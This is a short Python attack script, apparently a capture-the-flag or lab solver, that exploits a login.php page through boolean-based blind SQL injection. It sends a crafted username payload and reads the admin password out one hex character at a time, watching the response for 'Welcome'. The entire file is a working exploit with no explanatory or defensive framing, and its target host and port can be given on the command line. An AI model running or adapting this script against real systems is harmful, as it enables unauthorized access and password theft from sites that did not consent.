import requests
import sys

base = "1234567890ABCDEF"

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = sys.argv[2]
else:
    host = 'localhost'
    port = '9006'

url = f'http://{host}:{port}/'

path  = "login.php"



flag = ""
checkpoint = True

while checkpoint:
    for c in base:
        print(f"Trying {flag+c}")
        data = {"username[-1]": f"admin' and hex(password) LIKE '{flag+c}%'-- -", "password": "admin"}
        r = requests.post(url + path, data=data)
        if "Welcome" in r.text:
            flag += c
            print(flag)
            checkpoint = True
            break
        else:
            checkpoint = False